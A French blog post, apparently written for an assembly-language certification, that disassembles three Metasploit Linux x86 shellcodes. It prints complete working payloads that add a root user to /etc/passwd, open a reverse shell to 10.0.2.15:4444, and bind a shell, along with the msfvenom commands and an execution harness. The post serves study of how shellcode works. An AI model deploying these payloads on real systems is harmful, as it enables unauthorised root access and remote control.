# Analyse de trois payloads générés par metasploit #

Métasploit propose plusieurs payload présentés ci-dessous :

<a href="../assets/images/6_01.png"><img src = "../assets/images/6_01.png"></a>


Nous allons procéder à l'analyse des 3 payloads suivants: 
 - linux/x86/adduser,
 - linux/x86/reverse_tcp_shell,
 - linux/x86/shell/bind_tcp

## Premier payload, linux/x86/adduser: ##

Nous générons le code avec la commande :
```c
msfvenom -a x86 --platform linux -p linux/x86/adduser -f c
```
```c
No encoder or badchars specified, outputting raw payload
Payload size: 97 bytes
Final size of c file: 433 bytes
unsigned char buf[] = 
"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x28\x00\x00\x00\x6d\x65"
"\x74\x61\x73\x70\x6c\x6f\x69\x74\x3a\x41\x7a\x2f\x64\x49\x73"
"\x6a\x34\x70\x34\x49\x52\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a"
"\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58"
"\xcd\x80\x6a\x01\x58\xcd\x80";
```

Le shellcode est copié dans un fichier shellcode.c afin de pouvoir procéder à l'analyse. **C'est ce fichier qui sera utilisé lors des 3 analyses**

```c
#include <stdio.h>
#include <string.h>


unsigned char code[] = \
"Pur your shellcode here";

int main()
{

        printf("taille %lu\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

        return 0;

}
```

Puis compilé :

```c
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

Nous exécutons le programme et observons les modifications :

```c
./shellcode
more /etc/passwd | tail -1
metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh
```

Il y a effectivement un utilisateur qui vient d'être ajouté.

### Analyse du code ###

On lance **gdb** et observons le code ci-dessous :

Dans un premier temps, l'id de l'utilisateur effectif est défini à 0 soit root.
```c
    
    ; setreuid syscall (Fixe les ID d'utilisateur effectif et réel du processus appelant)
    ; int setreuid(uid_t ruid, uid_t euid);
    ; setreuid(0,0)

=> 0x08048500 <+0>:	xor    ecx,ecx
   0x08048502 <+2>:	mov    ebx,ecx
   0x08048504 <+4>:	push   0x46
   0x08048506 <+6>:	pop    eax			
   0x08048507 <+7>:	int    0x80                 
````

Le fichier /etc/passwd est ouvert en lecture, écriture.

```c
    ; open syscall (open file /etc/passwd)
    ; int open(const char *pathname, int flags, mode_t mode);

   0x08048509 <+9>:	push   0x5			    
   0x0804850b <+11>:	pop    eax
   0x0804850c <+12>:	xor    ecx,ecx
   0x0804850e <+14>:	push   ecx
   0x0804850f <+15>:	push   0x64777373		;dwss
   0x08048514 <+20>:	push   0x61702f2f		;ap//
   0x08048519 <+25>:	push   0x6374652f		;cte/
   0x0804851e <+30>:	mov    ebx,esp
   0x08048520 <+32>:	inc    ecx              
   0x08048521 <+33>:	mov    ch,0x4	; ecx = 0x401 = s_ixoth and s_irusr (read and execute)
   0x08048523 <+35>:	int    0x80			    
   0x08048525 <+37>:	xchg   ebx,eax

````
Nous avons ensuite un saut inconditionnel vers l'offset +83 ce qui correspond au saut de 0x804852b à 0x08048552
car cet espace contient la chaine de caractères "metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q\374j\004X̀j\001X̀"

```c
    ; jump to code at offset+83 soit 0x08048553
    ; Byte de 0x804852b à 0x08048552 correspond à 
    ; ECX: 0x804852b ("metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q\374j\004X̀j\001X̀") 

   0x08048526 <+38>:	call   0x8048553 <code+83>

    ; destination du jump
    ; ecx va prendre la valeur de la chaine qui sera stockée dans /etc/passwd
    ; edx = 0x28 soit la taille de la chaine

   0x08048553 <+83>:    pop ecx
   0x08048554 <+84>:    mov edx, DWORD PTR [ecx-0x4]
````

Cela est suivi par un write de la forme ssize_t write(int fd, const void *buf, size_t count);
ebx = file handler
ecx = chaine de caractère
edx = 0x28

puis un exit.
```c
    ; write syscall ssize_t write(int fd, const void *buf, size_t count);

   0x08048555 <+85>:	push   ecx
   0x08048556 <+86>:	cld   
   0x08048557 <+87>:	push   0x4
   0x08048559 <+89>:	pop    eax
   0x0804855a <+90>:	int    0x80	

    ; exit syscall

   0x0804855c <+92>:	push   0x1
   0x0804855e <+94>:	pop    eax
   0x0804855f <+95>:	int    0x80			
```

## Extras ##

Si nous regardons les options de msfvenom, nous voyons qu'il est possible de passer lors de la création du shellcode des arguments:

```c
msfvenom -p linux/x86/adduser --payload-options
|Options for payload/linux/x86/adduser:
|
|       Name: Linux Add User
|     Module: payload/linux/x86/adduser
|   Platform: Linux
|       Arch: x86
|Needs Admin: Yes
| Total size: 97
|       Rank: Normal
|
|Provided by:
|    skape <mmiller@hick.org>
|    vlad902 <vlad902@gmail.com>
|    spoonm <spoonm@no$email.com>
|
|Basic options:
|Name   Current Setting  Required  Description
----   ---------------  --------  -----------
PASS   metasploit       yes       The password for this user
SHELL  /bin/sh          no        The shell for this user
```

Par exemple en définissant un nouvel utilisateur :

```c
msfvenom -a x86 --platform=linux -p linux/x86/adduser USER=xophidia PASS=xophidia SHELL=/bin/bash -f c 
````

Nous obtenons :

```c
unsigned char buf[] = 
"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x28\x00\x00\x00\x78\x6f"
"\x70\x68\x69\x64\x69\x61\x3a\x41\x7a\x2f\x37\x76\x6e\x47\x46"
"\x32\x4e\x4e\x57\x36\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62"
"\x69\x6e\x2f\x62\x61\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58"
"\xcd\x80\x6a\x01\x58\xcd\x80";


./shellcode
more /etc/passwd | tail -1
xophidia:Az/7vnGF2NNW6:0:0::/:/bin/bash
```

## Second payload, linux/x86/shell_reverse_tcp: ##

La première étape consisté à genérer le shellcode et à regarder son fonctionnement :

```c
msfvenom -p linux/x86/shell_reverse_tcp -a x86 --platform linux -f c
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
Final size of c file: 311 bytes
unsigned char buf[] = 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x00\x02\x0f\x68"
"\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
"\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
````

Le code est ajouter au fichier shellcode.c tout comme le premier exemple puis compilé.


### Analyse du code ###

Cette première section est chargée d'exécuter l'appel system socketcall puis sys_socket de la forme
int socket(int domain, int type, int protocol);

```c
	; les deux premieres instructions mettent ebx et edx à 0
	; ebx = 1 ,ecx = 2, edx = 0
	
 8048500:	31 db                	xor    ebx,ebx
 8048502:	f7 e3                	mul    ebx	    ; protocol(0x0)
 8048504:	53                   	push   ebx      
 8048505:	43                   	inc    ebx  
 8048506:	53                   	push   ebx 	    ; type(0x1)
 8048507:	6a 02                	push   0x2	    ; domain(0x2)
 8048509:	89 e1                	mov    ecx,esp  ; save pointer to socket() args
 804850b:	b0 66                	mov    al,0x66	; sys_socketcall
 804850d:	cd 80                	int    0x80
```
L'appel systeme dup2 permet de dupliquer les descripteurs de fichiers. 
Cela permet de rediriger les sorties (stdin, stdout et stderr) afin de pouvoir obtenir une visualisation une fois la connexion établie.

```c
    ; save 
804850f:	93                   	xchg   ebx,eax
	; dup2 syscall
	; EAX: 0x1 EBX: 0x3 ECX: 0x2 
	; loop while sf = 0

 
 8048510:	59                   	pop    ecx
 8048511:	b0 3f                	mov    al,0x3f
 8048513:	cd 80                	int    0x80
 8048515:	49                   	dec    ecx
 8048516:	79 f9                	jns    8048511 <code+0x11>
```

```c
    ; Execute de nouveau sys_socketcall et sys_connect
	; int connect(int sockfd, const struct sockaddr *addr, addrlen)
    ; EAX: 0x0 
	; EBX: 0x3 
	; ECX: 0xffffcf4c --> 0x5c110002 
	; EDX: 0x0 
	; 
 8048518:	68 0a 00 02 0f       	push   0xf02000a  ; @ip 10.0.2.15
 804851d:	68 02 00 11 5c       	push   0x5c110002 ; port 4444(0x115c)
 8048522:	89 e1                	mov    ecx,esp
 8048524:	b0 66                	mov    al,0x66
 8048526:	50                   	push   eax	      
 8048527:	51                   	push   ecx	      ; @ of args	
 8048528:	53                   	push   ebx	      ;  
 8048529:	b3 03                	mov    bl,0x3 	  ; sockfd
 804852b:	89 e1                	mov    ecx,esp
 804852d:	cd 80                	int    0x80
```

```c
	; execve syscall
	; int execve(const char *filename, char *const argv[], char *const envp[]);
	; execute /bin/sh

 804852f:	52                   	push   edx	  ; null byte
 8048530:	68 6e 2f 73 68       	push   0x68732f6e ;"//bin/sh"
 8048535:	68 2f 2f 62 69       	push   0x69622f2f
 804853a:	89 e3                	mov    ebx,esp
 804853c:	52                   	push   edx
 804853d:	53                   	push   ebx
 804853e:	89 e1                	mov    ecx,esp
 8048540:	b0 0b                	mov    al,0xb	;syscall execve
 8048542:	cd 80                	int    0x80
````

### Testons le tout :###

Sur le premier terminal, nous lancons la communication et après connexion, nous accédons à un shell.

```c
nc -l -p 4444 -v
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [10.0.2.15] port 4444 [tcp/*] accepted (family 2, sport 37928)
id
uid=1000(xophidia) gid=1000(xophidia) groups=1000(xophidia),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
pwd
/home/xophidia/Documents
```

Landement du shellcode :
```c
./test_shellcode 
```

## Troisième payload, : linux/x86/shell/bind_tcp##

Nous procédons pour le troisième payload de la même manière que les deux précedents.

La première étape consiste à genérer le shellcode et à regarder son fonctionnement :

```c
msfvenom -p linux/x86/shell/bind_tcp --payload-options           
Options for payload/linux/x86/shell/bind_tcp:


       Name: Linux Command Shell, Bind TCP Stager (Linux x86)
     Module: payload/linux/x86/shell/bind_tcp
   Platform: Linux
       Arch: x86
Needs Admin: No
 Total size: 110
       Rank: Normal

Provided by:
    skape <mmiller@hick.org>
    egypt <egypt@metasploit.com>

Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
LPORT  4444             yes       The listen port
RHOST                   no        The target address

Description:
  Spawn a command shell (staged). Listen for a connection (Linux x86)
````

```c
msfvenom -p linux/x86/shell/bind_tcp -a x86 --platform linux -f c
No encoder or badchars specified, outputting raw payload
Payload size: 110 bytes
Final size of c file: 488 bytes
unsigned char buf[] = 
"\x6a\x7d\x58\x99\xb2\x07\xb9\x00\x10\x00\x00\x89\xe3\x66\x81"
"\xe3\x00\xf0\xcd\x80\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89"
"\xe1\xb0\x66\xcd\x80\x51\x6a\x04\x54\x6a\x02\x6a\x01\x50\x97"
"\x89\xe1\x6a\x0e\x5b\x6a\x66\x58\xcd\x80\x97\x83\xc4\x14\x59"
"\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a"
"\x66\x58\xcd\x80\xd1\xe3\xb0\x66\xcd\x80\x50\x43\xb0\x66\x89"
"\x51\x04\xcd\x80\x93\xb6\x0c\xb0\x03\xcd\x80\x87\xdf\x5b\xb0"
"\x06\xcd\x80\xff\xe1";
```

Cela est comme pour les deux premiers exemples, compilé puis analyser.

Cette première section est chargée d'exécuter l'appel system socketcall puis sys_socket de la forme
int socket(int domain, int type, int protocol);
```c
   0x08048500 <+0>:	xor    ebx,ebx
   0x08048502 <+2>:	mul    ebx	
   0x08048504 <+4>:	push   ebx  ; 0 protocol
   0x08048505 <+5>:	inc    ebx	; socket call
   0x08048506 <+6>:	push   ebx	; 1 type
   0x08048507 <+7>:	push   0x2	; 2 domain
   0x08048509 <+9>:	mov    ecx,esp	; args
   0x0804850b <+11>:	mov    al,0x66
   0x0804850d <+13>:	int    0x80	; syscall create
```
Ensuite nous utilisons l'appel système bind http://man7.org/linux/man-pages/man2/bind.2.html de la forme 
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen) afin de lier l'adresse au nom du socket précedement crée.

```c
   0x0804850f <+15>:	pop    ebx	; ebx 2
   0x08048510 <+16>:	pop    esi	; esi 1
   0x08048511 <+17>:	push   edx	;
   0x08048512 <+18>:	push   0x5c110002 ; port 4444
   0x08048517 <+23>:	push   0x10
   0x08048519 <+25>:	push   ecx
   0x0804851a <+26>:	push   eax
   0x0804851b <+27>:	mov    ecx,esp ; args addr
   0x0804851d <+29>:	push   0x66
   0x0804851f <+31>:	pop    eax
   0x08048520 <+32>:	int    0x80
```

Nous allons écouter la connexion via l'appel système listen http://man7.org/linux/man-pages/man2/listen.2.html de la forme int listen(int sockfd, int backlog);
Le stocket précédement crée est mis en mode passif en attente de connexion.

```c
   0x08048522 <+34>:	mov    DWORD PTR [ecx+0x4],eax
   0x08048525 <+37>:	mov    bl,0x4	; eax = 4
   0x08048527 <+39>:	mov    al,0x66
   0x08048529 <+41>:	int    0x80			; syscall connect 
```   

Pour accepter les connexions entrantes, il faut utiliser l'appel système accept http://man7.org/linux/man-pages/man2/accept.2.html de la forme 
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);


```c
   0x0804852b <+43>:	inc    ebx			; ebx = 5
   0x0804852c <+44>:	mov    al,0x66
   0x0804852e <+46>:	int    0x80			; syscall

   0x08048530 <+48>:	xchg   ebx,eax			; save the result
```

L'appel systeme dup2 permet de dupliquer les descripteurs de fichiers. 
Cela permet de rediriger les sorties (stdin, stdout et stderr) afin de pouvoir obtenir une visu lors du reverse.

```c   
   0x08048531 <+49>:	pop    ecx			
   0x08048532 <+50>:	push   0x3f			
   0x08048534 <+52>:	pop    eax
   0x08048535 <+53>:	int    0x80   
   0x08048537 <+55>:	dec    ecx
   0x08048538 <+56>:	jns    0x8048532 <code+50>
```


La commande /bin/sh est exécutée une fois la connexion établie.

```c
	; execve syscall
	; int execve(const char *filename, char *const argv[], char *const envp[]);
	; execute /bin/sh

   0x0804853a <+58>:	push   0x68732f2f		; hs//
   0x0804853f <+63>:	push   0x6e69622f       ; nib/
   0x08048544 <+68>:	mov    ebx,esp
   0x08048546 <+70>:	push   eax
   0x08048547 <+71>:	push   ebx
   0x08048548 <+72>:	mov    ecx,esp
   0x0804854a <+74>:	mov    al,0xb			; execve syscall
   0x0804854c <+76>:	int    0x80

```


This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: 